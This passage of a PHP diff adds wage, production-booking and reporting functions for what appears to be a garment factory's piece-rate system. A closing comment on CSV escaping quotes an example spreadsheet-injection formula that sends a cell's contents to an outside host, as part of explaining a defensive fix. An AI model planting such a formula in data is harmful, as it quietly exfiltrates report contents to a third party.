+    if ($sizeId > 0 && isset($sizeMap[$opId][$sizeId])) return (float)$sizeMap[$opId][$sizeId];
+    return $standard;
+}
+
+/* Where a rate came from, for a screen that has to explain itself. */
+function zp_rate_source(int $opId, array $map, array $sizeMap = [], int $sizeId = 0): string {
+    if (array_key_exists($opId, $map)) return 'order';
+    if ($sizeId > 0 && isset($sizeMap[$opId][$sizeId])) return 'size';
+    return 'standard';
+}
+
+/* ============================================================
+   WORKERS
+   ============================================================ */
+function zp_workers(bool $activeOnly = false): array {
+    zp_ensure_schema();
+    $sql = "SELECT * FROM zp_workers" . ($activeOnly ? " WHERE is_active=1" : "") . " ORDER BY worker_name";
+    try { return db()->query($sql)->fetchAll(); } catch (Throwable $e) { return []; }
+}
+
+function zp_save_worker(int $id, string $code, string $name, ?string $dept, int $active): array {
+    zp_ensure_schema();
+    $code = strtoupper(trim($code));
+    $name = trim($name);
+    $dept = ($dept === null || trim($dept) === '') ? null : trim($dept);
+    if ($name === '') return ['ok' => false, 'id' => 0, 'error' => 'Worker name is required.'];
+    if ($code === '') {
+        /* A CODE IS GIVEN, NOT DEMANDED. Asking a data-entry clerk to invent a
+           unique code for 200 workers is how you get W1, w1 and W01 for the
+           same person. W001 upward, derived from what is already there. */
+        try {
+            $n = (int)db()->query("SELECT COUNT(*) FROM zp_workers")->fetchColumn();
+        } catch (Throwable $e) { $n = 0; }
+        do {
+            $n++;
+            $code = 'W' . str_pad((string)$n, 3, '0', STR_PAD_LEFT);
+            $c = db()->prepare("SELECT COUNT(*) FROM zp_workers WHERE worker_code=?");
+            $c->execute([$code]);
+        } while ((int)$c->fetchColumn() > 0 && $n < 100000);
+    }
+    $dup = db()->prepare("SELECT id FROM zp_workers WHERE worker_code=? AND id<>?");
+    $dup->execute([$code, $id]);
+    if ($dup->fetchColumn()) return ['ok' => false, 'id' => 0, 'error' => 'Code "' . $code . '" already belongs to another worker.'];
+
+    if ($id > 0) {
+        db()->prepare("UPDATE zp_workers SET worker_code=?, worker_name=?, department=?, is_active=? WHERE id=?")
+            ->execute([$code, $name, $dept, $active ? 1 : 0, $id]);
+        return ['ok' => true, 'id' => $id, 'error' => ''];
+    }
+    db()->prepare("INSERT INTO zp_workers (worker_code, worker_name, department, is_active) VALUES (?,?,?,?)")
+        ->execute([$code, $name, $dept, $active ? 1 : 0]);
+    return ['ok' => true, 'id' => (int)db()->lastInsertId(), 'error' => ''];
+}
+
+/* A WORKER WITH WAGES IS NEVER DELETED. Their name is on every entry they were
+   paid for; removing the row would leave those wages belonging to nobody. */
+function zp_delete_worker(int $id): array {
+    zp_ensure_schema();
+    $c = db()->prepare("SELECT COUNT(*) FROM zp_entries WHERE worker_id=?");
+    $c->execute([$id]);
+    if ((int)$c->fetchColumn() > 0) {
+        db()->prepare("UPDATE zp_workers SET is_active=0 WHERE id=?")->execute([$id]);
+        return ['ok' => true, 'deleted' => false,
+                'msg' => 'That worker has production entries against their name, so they have been set inactive instead of deleted. Every wage they were paid keeps their name on it.'];
+    }
+    db()->prepare("DELETE FROM zp_workers WHERE id=?")->execute([$id]);
+    return ['ok' => true, 'deleted' => true, 'msg' => 'Worker deleted — they had no entries.'];
+}
+
+/* ============================================================
+   BOOKING THE DAY'S WORK
+   ============================================================
+
+   $rows = [ ['item_id','part_id','op_id','worker_id','qty'], ... ]
+
+   NOTHING IS WRITTEN UNTIL EVERY ROW PASSES. A day sheet half-saved is worse
+   than one refused: you cannot tell which half went in, and re-entering it
+   double-books the half that did.
+*/
+function zp_book(string $date, array $rows, ?int $userId = null): array {
+    zp_ensure_schema();
+    $date = trim($date) !== '' ? trim($date) : date('Y-m-d');
+    if (!preg_match('/^\d{4}-\d{2}-\d{2}$/', $date)) return ['ok' => false, 'errors' => ['That date is not a real date.'], 'saved' => 0];
+    /* A DATE IN THE FUTURE IS ALWAYS A TYPO. Wages cannot be earned tomorrow. */
+    if ($date > date('Y-m-d')) return ['ok' => false, 'errors' => ['That date is in the future. Production cannot be booked before it happens.'], 'saved' => 0];
+
+    $lines = [];
+    foreach (zp_open_lines() as $l) $lines[(int)$l['item_id']] = $l;
+    $prog = zp_progress_map();
+
+    $errors = []; $ready = []; $batch = []; $rateCache = []; $sizeRateCache = [];
+    foreach ($rows as $i => $r) {
+        $label  = 'Line ' . ($i + 1);
+        $itemId = (int)($r['item_id'] ?? 0);
+        $partId = (int)($r['part_id'] ?? 0);
+        $opId   = (int)($r['op_id'] ?? 0);
+        $wid    = (int)($r['worker_id'] ?? 0);
+        $qty    = (float)str_replace(',', '', (string)($r['qty'] ?? 0));
+
+        if (!$itemId && !$opId && !$wid && $qty <= 0) continue;      // an untouched blank row
+        if (!$itemId)      { $errors[] = "$label: pick the order line."; continue; }
+        if (!$opId)        { $errors[] = "$label: pick the operation."; continue; }
+        if (!$wid)         { $errors[] = "$label: pick the worker."; continue; }
+        if ($qty <= 0)     { $errors[] = "$label: quantity must be more than 0."; continue; }
+        if (!isset($lines[$itemId])) { $errors[] = "$label: that order line is no longer switched on for production."; continue; }
+
+        $line = $lines[$itemId];
+
+        $opSt = db()->prepare("SELECT o.*, p.part_name FROM zp_part_ops o
+                               JOIN zp_parts p ON p.id = o.part_id
+                               WHERE o.id=? AND o.is_active=1");
+        $opSt->execute([$opId]);
+        $op = $opSt->fetch();
+        if (!$op) { $errors[] = "$label: that operation no longer exists, or has been switched off."; continue; }
+        if ($partId <= 0) $partId = (int)$op['part_id'];
+        if ($partId !== (int)$op['part_id']) { $errors[] = "$label: that operation belongs to a different part."; continue; }
+
+        /* the part must actually be on the product this line makes */
+        $onProd = false;
+        foreach (zp_product_parts((int)$line['product_id']) as $pp) if ((int)$pp['id'] === $partId) { $onProd = true; break; }
+        if (!$onProd) { $errors[] = "$label: \"{$op['part_name']}\" is not a part of {$line['product_name']}."; continue; }
+
+        $wSt = db()->prepare("SELECT * FROM zp_workers WHERE id=? AND is_active=1");
+        $wSt->execute([$wid]);
+        if (!$wSt->fetch()) { $errors[] = "$label: that worker is not on the active list."; continue; }
+
+        /* ROWS EARLIER IN THIS SAME SAVE COUNT AGAINST THIS ONE. Two lines for
+           the same operation must add up against one allowance, or the sheet
+           can book twice what exists by splitting it in half. */
+        $key   = $itemId . ':' . $partId . ':' . $opId;
+        $taken = $batch[$key] ?? 0.0;
+        $left  = zp_remaining($line, $partId, $opId, (string)$op['stage'], $prog) - $taken;
+
+        if ($qty > $left + 0.0001) {
+            $num = rtrim(rtrim(number_format(max(0, $left), 2), '0'), '.');
+            $why = zp_is_cutting($op['stage'])
+                ? "that is all the order needs"
+                : "only {$num} have been cut, and you cannot stitch more than was cut";
+            $errors[] = "$label: only {$num} left for {$op['operation_name']} on \"{$op['part_name']}\" — {$why}.";
+            continue;
+        }
+        $batch[$key] = $taken + $qty;
+
+        $pfid = (int)$line['proforma_id'];
+        if (!isset($rateCache[$pfid])) $rateCache[$pfid] = zp_order_rate_map($pfid);
+        /* the size rates belong to the PRODUCT, not the order, so they are
+           cached per product — several orders of the same product share one
+           lookup instead of one each */
+        $prodId = (int)$line['product_id'];
+        if (!isset($sizeRateCache[$prodId])) $sizeRateCache[$prodId] = zp_op_rate_map($prodId);
+        $rate = zp_rate_for($opId, (float)$op['rate'], $rateCache[$pfid],
+                            $sizeRateCache[$prodId], zp_line_size_id($line));
+
+        $ready[] = [
+            'entry_date' => $date, 'worker_id' => $wid,
+            'proforma_id' => $pfid, 'proforma_item_id' => $itemId,
+            'product_id' => (int)$line['product_id'], 'part_id' => $partId,
+            /* the id is what the wage is filed under; the name rides along so a
+               report can print it without a join, and both come from the SAME
+               operation row so they can never drift apart */
+            'op_id' => $opId,
+            'stage_id' => (int)($op['stage_id'] ?: zp_stage_id_for((string)$op['stage'])),
+            'stage' => (string)$op['stage'], 'qty' => $qty,
+            /* FROZEN HERE, FOR GOOD. Change the rate tomorrow and this wage
+               stays exactly what was paid today. */
+            'rate_applied' => $rate, 'amount' => round($qty * $rate, 2),
+            'note' => mb_substr(trim((string)($r['note'] ?? '')), 0, 255) ?: null,
+            'created_by' => $userId,
+        ];
+    }
+
+    if ($errors) return ['ok' => false, 'errors' => $errors, 'saved' => 0];
+    if (!$ready)  return ['ok' => false, 'errors' => ['Nothing to save — fill in at least one line.'], 'saved' => 0];
+
+    db()->beginTransaction();
+    try {
+        $ins = db()->prepare("INSERT INTO zp_entries
+            (entry_date, worker_id, proforma_id, proforma_item_id, product_id, part_id, op_id,
+             stage_id, stage, qty, rate_applied, amount, note, created_by)
+            VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,?)");
+        foreach ($ready as $e) {
+            $ins->execute([$e['entry_date'], $e['worker_id'], $e['proforma_id'], $e['proforma_item_id'],
+                           $e['product_id'], $e['part_id'], $e['op_id'], $e['stage_id'], $e['stage'], $e['qty'],
+                           $e['rate_applied'], $e['amount'], $e['note'], $e['created_by']]);
+        }
+        db()->commit();
+    } catch (Throwable $e) {
+        db()->rollBack();
+        return ['ok' => false, 'errors' => ['Nothing was saved — the database refused the sheet. ' . $e->getMessage()], 'saved' => 0];
+    }
+    return ['ok' => true, 'errors' => [], 'saved' => count($ready),
+            'amount' => round(array_sum(array_column($ready, 'amount')), 2)];
+}
+
+/* A CORRECTION IS VISIBLE, NEVER INVISIBLE. The row stays, marked cancelled,
+   with who did it and why. Deleting it would make the day's total change with
+   nothing to explain it. */
+function zp_cancel_entry(int $id, string $reason, ?int $userId = null): array {
+    zp_ensure_schema();
+    $reason = trim($reason);
+    if ($reason === '') return ['ok' => false, 'error' => 'Give a reason — a correction with no reason cannot be checked later.'];
+    $st = db()->prepare("SELECT * FROM zp_entries WHERE id=?");
+    $st->execute([$id]);
+    $e = $st->fetch();
+    if (!$e) return ['ok' => false, 'error' => 'That entry no longer exists.'];
+    if ($e['status'] !== 'active') return ['ok' => false, 'error' => 'That entry was already cancelled.'];
+
+    /* STITCHING STANDS ON CUTTING. Cancelling a cutting entry that stitching
+       has already been booked against would leave stitched pieces that were
+       never cut — a number that can never be made true again. */
+    if (zp_is_cutting((string)$e['stage'])) {
+        $prog = zp_progress_map();
+        $it = (int)$e['proforma_item_id']; $pt = (int)$e['part_id'];
+        $cut      = (float)($prog['stage'][$it][$pt]['cut'] ?? 0);
+        $stitched = (float)($prog['stage'][$it][$pt]['stitched'] ?? 0);
+        if ($cut - (float)$e['qty'] < $stitched - 0.0001) {
+            $n = rtrim(rtrim(number_format($stitched, 2), '0'), '.');
+            return ['ok' => false, 'error' => "Cannot cancel this cutting entry — {$n} pieces have already been stitched against it. Cancel the stitching first."];
+        }
+    }
+
+    db()->prepare("UPDATE zp_entries SET status='cancelled', cancelled_by=?, cancelled_at=NOW(), cancel_reason=? WHERE id=?")
+        ->execute([$userId, mb_substr($reason, 0, 255), $id]);
+    return ['ok' => true, 'error' => ''];
+}
+
+/* The day's entries, newest first, with every name already joined on. */
+function zp_entries(array $filter = [], int $limit = 300): array {
+    zp_ensure_schema();
+    $sql = "SELECT e.*, w.worker_name, w.worker_code, p.name product_name,
+                   pt.part_name, o.operation_name, pf.pi_no
+            FROM zp_entries e
+            LEFT JOIN zp_workers w  ON w.id  = e.worker_id
+            LEFT JOIN products  p   ON p.id  = e.product_id
+            LEFT JOIN zp_parts  pt  ON pt.id = e.part_id
+            LEFT JOIN zp_part_ops o ON o.id  = e.op_id
+            LEFT JOIN proforma_invoices pf ON pf.id = e.proforma_id
+            WHERE 1=1";
+    /* LEFT JOIN, not INNER, on every one of those.
+       An entry whose operation was later removed used to VANISH from the list
+       while its wage still counted in the total — a report that did not add up
+       and gave no clue why. */
+    $p = [];
+    if (!empty($filter['date']))      { $sql .= " AND e.entry_date = ?";  $p[] = $filter['date']; }
+    if (!empty($filter['from']))      { $sql .= " AND e.entry_date >= ?"; $p[] = $filter['from']; }
+    if (!empty($filter['to']))        { $sql .= " AND e.entry_date <= ?"; $p[] = $filter['to']; }
+    if (!empty($filter['worker_id'])) { $sql .= " AND e.worker_id = ?";   $p[] = (int)$filter['worker_id']; }
+    if (!empty($filter['status']))    { $sql .= " AND e.status = ?";      $p[] = $filter['status']; }
+    $sql .= " ORDER BY e.entry_date DESC, e.id DESC LIMIT " . (int)$limit;
+    try { $st = db()->prepare($sql); $st->execute($p); return $st->fetchAll(); } catch (Throwable $e) { return []; }
+}
+
+/* ============================================================
+   REPORTING
+   ============================================================
+
+   EVERY FIGURE ON EVERY REPORT COMES FROM THE SAME LEDGER, filtered the same
+   way: status='active'. That is the one decision, made once. A report that
+   counted cancelled rows and a dashboard that did not would disagree about the
+   wage bill, and nobody would be able to say which was right.
+
+   All of these are ONE grouped query each. The old module asked per row and ran
+   hundreds of queries to draw one table. */
+
+function zp_range(?string $from, ?string $to): array {
+    $to   = ($to   && preg_match('/^\d{4}-\d{2}-\d{2}$/', $to))   ? $to   : date('Y-m-d');
+    $from = ($from && preg_match('/^\d{4}-\d{2}-\d{2}$/', $from)) ? $from : date('Y-m-d', strtotime('-29 days'));
+    /* A BACKWARDS RANGE IS A TYPO, NOT A QUESTION. Swapped rather than returning
+       nothing, because an empty report reads as "no production happened". */
+    if ($from > $to) { $t = $from; $from = $to; $to = $t; }
+    return [$from, $to];
+}
+
+/* [stage => qty], plus 'wage' and 'entries'. */
+function zp_totals(string $from, string $to): array {
+    zp_ensure_schema();
+    $out = ['wage' => 0.0, 'entries' => 0, 'qty' => 0.0];
+    foreach (zp_stages() as $s) $out[$s] = 0.0;
+    try {
+        $st = db()->prepare("SELECT stage, SUM(qty) q, SUM(amount) amt, COUNT(*) n
+                             FROM zp_entries WHERE status='active' AND entry_date BETWEEN ? AND ?
+                             GROUP BY stage");
+        $st->execute([$from, $to]);
+        foreach ($st->fetchAll() as $r) {
+            $out[$r['stage']] = (float)$r['q'];
+            $out['wage']    += (float)$r['amt'];
+            $out['entries'] += (int)$r['n'];
+            $out['qty']     += (float)$r['q'];
+        }
+    } catch (Throwable $e) {}
+    return $out;
+}
+
+/* One row per DAY in the range, including days with nothing on them.
+   A missing day is information — a gap in the line means the floor stopped —
+   and leaving it out of the series would draw a smooth line over a shutdown. */
+function zp_daily(string $from, string $to): array {
+    zp_ensure_schema();
+    $days = [];
+    for ($d = $from; $d <= $to; $d = date('Y-m-d', strtotime($d . ' +1 day'))) {
+        $days[$d] = ['date' => $d, 'qty' => 0.0, 'wage' => 0.0];
+        foreach (zp_stages() as $s) $days[$d][$s] = 0.0;
+        if (count($days) > 400) break;                 // a range nobody meant
+    }
+    try {
+        $st = db()->prepare("SELECT entry_date, stage, SUM(qty) q, SUM(amount) amt
+                             FROM zp_entries WHERE status='active' AND entry_date BETWEEN ? AND ?
+                             GROUP BY entry_date, stage");
+        $st->execute([$from, $to]);
+        foreach ($st->fetchAll() as $r) {
+            $d = $r['entry_date'];
+            if (!isset($days[$d])) continue;
+            $days[$d][$r['stage']] = (float)$r['q'];
+            $days[$d]['qty']  += (float)$r['q'];
+            $days[$d]['wage'] += (float)$r['amt'];
+        }
+    } catch (Throwable $e) {}
+    return array_values($days);
+}
+
+function zp_by_worker(string $from, string $to): array {
+    zp_ensure_schema();
+    try {
+        $st = db()->prepare("SELECT e.worker_id, w.worker_code, w.worker_name, w.department,
+                                    COUNT(*) entries, SUM(e.qty) qty, SUM(e.amount) wage,
+                                    COUNT(DISTINCT e.entry_date) days
+                             FROM zp_entries e LEFT JOIN zp_workers w ON w.id = e.worker_id
+                             WHERE e.status='active' AND e.entry_date BETWEEN ? AND ?
+                             GROUP BY e.worker_id, w.worker_code, w.worker_name, w.department
+                             ORDER BY wage DESC");
+        $st->execute([$from, $to]);
+        return $st->fetchAll();
+    } catch (Throwable $e) { return []; }
+}
+
+/* DEPARTMENT-WISE WAGE COST — asked for directly: "in future I would ask daily
+   wages cost by each department as we have 6 different production floors".
+   The department lives on the WORKER, so this is where it comes from. A worker
+   with no department is grouped as "(no department)" rather than dropped —
+   dropping them would make the parts not add up to the whole. */
+function zp_by_department(string $from, string $to): array {
+    zp_ensure_schema();
+    try {
+        $st = db()->prepare("SELECT COALESCE(NULLIF(TRIM(w.department),''),'(no department)') dept,
+                                    COUNT(DISTINCT e.worker_id) workers, SUM(e.qty) qty, SUM(e.amount) wage
+                             FROM zp_entries e LEFT JOIN zp_workers w ON w.id = e.worker_id
+                             WHERE e.status='active' AND e.entry_date BETWEEN ? AND ?
+                             GROUP BY dept ORDER BY wage DESC");
+        $st->execute([$from, $to]);
+        return $st->fetchAll();
+    } catch (Throwable $e) { return []; }
+}
+
+function zp_by_product(string $from, string $to): array {
+    zp_ensure_schema();
+    try {
+        $st = db()->prepare("SELECT e.product_id, p.name product_name,
+                                    SUM(e.qty) qty, SUM(e.amount) wage, COUNT(*) entries
+                             FROM zp_entries e LEFT JOIN products p ON p.id = e.product_id
+                             WHERE e.status='active' AND e.entry_date BETWEEN ? AND ?
+                             GROUP BY e.product_id, p.name ORDER BY wage DESC");
+        $st->execute([$from, $to]);
+        return $st->fetchAll();
+    } catch (Throwable $e) { return []; }
+}
+
+function zp_by_operation(string $from, string $to): array {
+    zp_ensure_schema();
+    try {
+        /* LEFT JOIN, so an entry whose operation was later removed still shows.
+           An INNER JOIN would hide the row while its wage stayed in the total —
+           a report that does not add up and gives no clue why. */
+        $st = db()->prepare("SELECT e.op_id, e.stage,
+                                    COALESCE(pt.part_name,'(removed part)') part_name,
+                                    COALESCE(o.operation_name,'(removed operation)') operation_name,
+                                    SUM(e.qty) qty, SUM(e.amount) wage
+                             FROM zp_entries e
+                             LEFT JOIN zp_part_ops o ON o.id = e.op_id
+                             LEFT JOIN zp_parts pt   ON pt.id = e.part_id
+                             WHERE e.status='active' AND e.entry_date BETWEEN ? AND ?
+                             GROUP BY e.op_id, e.stage, pt.part_name, o.operation_name
+                             ORDER BY wage DESC");
+        $st->execute([$from, $to]);
+        return $st->fetchAll();
+    } catch (Throwable $e) { return []; }
+}
+
+/* ORDER PROGRESS — for each live order line, how far each part has got.
+   Built from the SAME zp_pieces_needed() and zp_remaining() the entry screen
+   uses, so a dashboard can never claim an order is finished while the entry
+   screen still offers work on it. */
+function zp_order_progress(): array {
+    $prog  = zp_progress_map();
+    $out   = [];
+    foreach (zp_open_lines() as $l) {
+        $pid = (int)$l['product_id'];
+        $needTot = 0.0; $cutTot = 0.0; $stitchTot = 0.0; $behind = []; $noSize = false;
+        foreach (zp_product_parts($pid) as $p) {
+            $partId = (int)$p['id'];
+            $need   = zp_pieces_needed($l, $partId);
+            /* ZP_NO_SIZE must never reach a total. Adding -1 in would quietly
+               REDUCE what the order appears to need and push the percentage up,
+               so a line nobody can even book would make the order look ahead of
+               where it is. The line is counted as unplannable instead. */
+            if ($need === ZP_NO_SIZE) { $noSize = true; continue; }
+            $cut    = (float)($prog['stage'][(int)$l['item_id']][$partId]['cut'] ?? 0);
+            $stitch = (float)($prog['stage'][(int)$l['item_id']][$partId]['stitched'] ?? 0);
+            $needTot   += $need;
+            $cutTot    += min($cut, $need);
+            $stitchTot += min($stitch, $need);
+            if ($need > 0 && $cut < $need) $behind[] = $p['part_name'] . ' (cutting)';
+            elseif ($need > 0 && $stitch < $need) $behind[] = $p['part_name'] . ' (stitching)';
+        }
+        $out[] = [
+            'item_id' => (int)$l['item_id'], 'pi_no' => $l['pi_no'],
+            'customer' => $l['customer_name'], 'product' => $l['product_name'],
+            'size' => $l['size'], 'ordered' => (float)$l['ordered_qty'],
+            'needed' => $needTot, 'cut' => $cutTot, 'stitched' => $stitchTot,
+            /* COMPLETION IS MEASURED ON THE LAST STAGE THAT RUNS, which is
+               stitching. Measuring on cutting would call an order finished
+               while nothing had been sewn. */
+            /* an order carrying an unplannable line has NO honest percentage,
+               so it reports 0 and says why rather than showing a number built
+               from only the parts that happened to resolve */
+            'pct' => ($noSize || $needTot <= 0) ? 0.0 : round($stitchTot / $needTot * 100, 1),
+            'no_size' => $noSize,
+            'size_problem' => $noSize ? zp_size_problem($l) : '',
+            'behind' => $behind,
+        ];
+    }
+    usort($out, fn($a, $b) => $a['pct'] <=> $b['pct']);
+    return $out;
+}
+
+/* ============================================================
+   PER-ORDER RATE AMENDMENTS
+   ============================================================ */
+function zp_order_rate_save(int $proformaId, int $opId, float $rate, string $reason, ?int $userId = null): array {
+    zp_ensure_schema();
+    $reason = trim($reason);
+    if ($proformaId <= 0 || $opId <= 0) return ['ok' => false, 'error' => 'Pick the order and the operation.'];
+    if ($rate < 0) return ['ok' => false, 'error' => 'A rate cannot be negative.'];
+    /* A REASON IS NOT OPTIONAL. An amended rate that nobody can explain six
+       months later is indistinguishable from a mistake. */
+    if ($reason === '') return ['ok' => false, 'error' => 'Give the reason for this order paying a different rate.'];
+
+    $opSt = db()->prepare("SELECT o.*, p.part_name FROM zp_part_ops o JOIN zp_parts p ON p.id=o.part_id WHERE o.id=?");
+    $opSt->execute([$opId]);
+    $op = $opSt->fetch();
+    if (!$op) return ['ok' => false, 'error' => 'That operation no longer exists.'];
+
+    $cur = db()->prepare("SELECT rate FROM zp_order_rates WHERE proforma_id=? AND op_id=?");
+    $cur->execute([$proformaId, $opId]);
+    $old = $cur->fetchColumn();
+    $old = $old === false ? (float)$op['rate'] : (float)$old;
+
+    db()->prepare("INSERT INTO zp_order_rates (proforma_id, op_id, rate, reason, created_by)
+                   VALUES (?,?,?,?,?)
+                   ON DUPLICATE KEY UPDATE rate=VALUES(rate), reason=VALUES(reason), created_by=VALUES(created_by)")
+        ->execute([$proformaId, $opId, round($rate, 2), mb_substr($reason, 0, 255), $userId]);
+
+    zp_rate_log($opId, $proformaId, $op['part_name'], $op['operation_name'], $old, round($rate, 2), $reason, $userId);
+    return ['ok' => true, 'error' => ''];
+}
+
+/* Clearing an amendment puts the order back on the standard rate FROM NOW ON.
+   Wages already booked keep the rate they were paid at — that is what
+   rate_applied is for, and it is why this is safe to undo. */
+function zp_order_rate_clear(int $proformaId, int $opId, ?int $userId = null): void {
+    zp_ensure_schema();
+    $opSt = db()->prepare("SELECT o.*, p.part_name FROM zp_part_ops o JOIN zp_parts p ON p.id=o.part_id WHERE o.id=?");
+    $opSt->execute([$opId]);
+    $op = $opSt->fetch();
+    $cur = db()->prepare("SELECT rate FROM zp_order_rates WHERE proforma_id=? AND op_id=?");
+    $cur->execute([$proformaId, $opId]);
+    $old = $cur->fetchColumn();
+    db()->prepare("DELETE FROM zp_order_rates WHERE proforma_id=? AND op_id=?")->execute([$proformaId, $opId]);
+    if ($op) zp_rate_log($opId, $proformaId, $op['part_name'], $op['operation_name'],
+                         $old === false ? null : (float)$old, (float)$op['rate'],
+                         'Amendment removed — back to the standard rate', $userId);
+}
+
+/* Orders that can carry an amendment, EACH ONE MARKED WITH WHETHER ANYTHING IS
+ * ACTUALLY IN PLAY ON IT.
+ *
+ * Switching an order on for production is not the same as having made
+ * something for it. Most of the list is normally orders where nobody has cut a
+ * single piece, and burying the two orders that are running inside forty that
+ * are not is how the wrong order gets amended.
+ *
+ * So each row now carries:
+ *   worked_ops   how many operations have real booked work on this order
+ *   amend_count  how many amendments this order already carries
+ *   active       either of those is greater than zero
+ *
+ * Nothing is removed from the list — the screen groups on this instead, because
+ * the honest time to amend a rate is BEFORE the work is booked, and an order
+ * that has been dropped from the list cannot be amended at all. */
+function zp_rate_orders(): array {
+    zp_ensure_schema(); zp_orders_schema();
+    try {
+        $rows = db()->query("SELECT pf.id, pf.pi_no, pf.customer_name
+                             FROM proforma_invoices pf
+                             WHERE pf.production_enabled = 1
+                             ORDER BY pf.id DESC LIMIT 200")->fetchAll();
+    } catch (Throwable $e) { return []; }
+    if (!$rows) return [];
+
+    $worked = []; $amends = [];
+    try {
+        foreach (db()->query("SELECT proforma_id, COUNT(DISTINCT op_id) c
+                              FROM zp_entries WHERE status='active' GROUP BY proforma_id")->fetchAll() as $r)
+            $worked[(int)$r['proforma_id']] = (int)$r['c'];
+    } catch (Throwable $e) {}
+    try {
+        foreach (db()->query("SELECT proforma_id, COUNT(*) c FROM zp_order_rates GROUP BY proforma_id")->fetchAll() as $r)
+            $amends[(int)$r['proforma_id']] = (int)$r['c'];
+    } catch (Throwable $e) {}
+
+    foreach ($rows as &$r) {
+        $id = (int)$r['id'];
+        $r['worked_ops']  = $worked[$id] ?? 0;
+        $r['amend_count'] = $amends[$id] ?? 0;
+        $r['active']      = ($r['worked_ops'] > 0 || $r['amend_count'] > 0);
+    }
+    unset($r);
+    return $rows;
+}
+
+function zp_booked_on_order(int $proformaId): array {
+    zp_ensure_schema();
+    $out = [];
+    try {
+        $st = db()->prepare("SELECT op_id, SUM(qty) q, SUM(amount) amt
+                             FROM zp_entries WHERE status='active' AND proforma_id=? GROUP BY op_id");
+        $st->execute([$proformaId]);
+        foreach ($st->fetchAll() as $r) $out[(int)$r['op_id']] = ['qty' => (float)$r['q'], 'amt' => (float)$r['amt']];
+    } catch (Throwable $e) {}
+    return $out;
+}
+
+/* THE OPERATIONS THAT CONCERN ONE ORDER, AND HOW CLOSELY.
+ *
+ * Scoping is already correct in one respect — only the parts of the products
+ * THIS order's lines actually make ever appear, never the whole part library.
+ * But that is still too wide to amend against: a product with nine parts and
+ * four operations each puts thirty-six rows on screen for an order where two
+ * operations have ever been worked. Amending the wrong one of thirty-six is
+ * easy and it is silent.
+ *
+ * So every row now carries 'related', which is TRUE when this order has
+ * actually got something riding on that operation:
+ *
+ *     booked_qty > 0    real work has been booked on it FOR THIS ORDER, or
+ *     amended           this order already pays a different rate for it.
+ *
+ * The screen shows the related rows and keeps the rest one click away. It is
+ * NOT a hard filter, deliberately: the correct moment to amend a rate is
+ * BEFORE the work is booked, because an amendment only ever applies to work
+ * booked after it. Hiding unworked operations permanently would make the most
+ * useful amendment of all impossible to enter.
+ *
+ * STRANDED ROWS ARE PULLED BACK IN. If a part is removed from a product after
+ * work was booked on it, its operation disappears from the walk above — and any
+ * amendment on it would become invisible AND un-removable. The second pass
+ * below finds anything this order has booked work or an amendment on and adds
+ * it back, marked on_order=false. Nothing this order is carrying can hide.
+ *
+ * One more fix while here: the old version keyed by op id inside the product
+ * loop, so when two products on the same order shared a part, the LAST product
+ * name silently overwrote the first. Product names are now collected as a list. */
+function zp_ops_for_order(int $proformaId): array {
+    $booked = zp_booked_on_order($proformaId);
+    $amend  = zp_order_rate_map($proformaId);
+    $out    = [];
+
+    $row = function (int $oid, string $part, string $op, string $stage, float $std, bool $onOrder) use ($booked, $amend) {
+        return [
+            'id' => $oid, 'part' => $part, 'operation' => $op, 'stage' => $stage,
+            'standard' => $std, 'products' => [],
+            'booked_qty' => (float)($booked[$oid]['qty'] ?? 0),
+            'booked_amt' => (float)($booked[$oid]['amt'] ?? 0),
+            'amended'    => array_key_exists($oid, $amend),
+            'on_order'   => $onOrder,
+        ];
+    };
+
+    foreach (zp_open_lines() as $l) {
+        if ((int)$l['proforma_id'] !== $proformaId) continue;
+        foreach (zp_product_parts((int)$l['product_id']) as $p) {
+            foreach (zp_part_ops((int)$p['id'], true) as $o) {
+                $oid = (int)$o['id'];
+                if (!isset($out[$oid]))
+                    $out[$oid] = $row($oid, (string)$p['part_name'], (string)$o['operation_name'],
+                                      (string)$o['stage'], (float)$o['rate'], true);
+                $name = trim((string)$l['product_name']);
+                if ($name !== '' && !in_array($name, $out[$oid]['products'], true))
+                    $out[$oid]['products'][] = $name;
+            }
+        }
+    }
+
+    /* Second pass: anything this order is carrying that the walk above missed. */
+    $stray = array_diff(array_merge(array_keys($booked), array_keys($amend)), array_keys($out));
+    if ($stray) {
+        try {
+            $in = implode(',', array_fill(0, count($stray), '?'));
+            $st = db()->prepare("SELECT o.id, o.operation_name, o.stage, o.rate, p.part_name
+                                 FROM zp_part_ops o JOIN zp_parts p ON p.id = o.part_id
+                                 WHERE o.id IN ($in)");
+            $st->execute(array_values(array_map('intval', $stray)));
+            foreach ($st->fetchAll() as $s) {
+                $oid = (int)$s['id'];
+                $out[$oid] = $row($oid, (string)$s['part_name'], (string)$s['operation_name'],
+                                  (string)$s['stage'], (float)$s['rate'], false);
+            }
+        } catch (Throwable $e) {}
+    }
+
+    foreach ($out as &$r) $r['related'] = ($r['booked_qty'] > 0 || $r['amended']);
+    unset($r);
+
+    /* Worked and amended rows first — what the screen is for is at the top. */
+    $out = array_values($out);
+    usort($out, function ($a, $b) {
+        if ($a['related'] !== $b['related']) return $a['related'] ? -1 : 1;
+        if ($a['booked_qty'] !== $b['booked_qty']) return $b['booked_qty'] <=> $a['booked_qty'];
+        return strcmp($a['part'] . $a['operation'], $b['part'] . $b['operation']);
+    });
+    return $out;
+}
+
+/* ============================================================
+   CSV SAFETY — A SPREADSHEET IS A PROGRAM, NOT A DOCUMENT
+   ============================================================
+
+   Found in a security pass, and it matters here more than in most apps.
+
+   Excel treats a cell beginning with =, +, - or @ as a FORMULA, not as text.
+   Your part names, product names and worker names are typed by a data-entry
+   team — and then exported to CSV and opened by whoever asked for the report.
+   A part named
+
+       =HYPERLINK("http://somewhere/?"&A1,"Bed Sheet")
+
+   looks like an ordinary name on screen. Opened in Excel it becomes a live
+   link that carries the contents of a neighbouring cell to somebody else's
+   server, and it looks entirely legitimate while doing it. Older Excel with DDE
+   enabled could be talked into worse.
+
+   THE FIX: a cell that starts with one of those characters is prefixed with a
+   single quote on the way out, which is Excel's own "treat this as text"
+   marker. It displays as the original text and cannot execute.
+
+   AND THE ROUND TRIP IS PRESERVED: the import strips ONE leading quote back
+   off, so a file exported and re-imported is unchanged. Without that half, a
+   name would gain a quote every time it made the trip. */
+function zp_csv_cell($v): string {
+    $s = (string)$v;
+    if ($s === '') return $s;
+    /* tab and carriage return are here too: Excel strips them and can end up
+       looking at the character behind them, which may be an =
+     *
+     * AND AN APOSTROPHE IS IN THIS LIST, which is not obvious and is not about
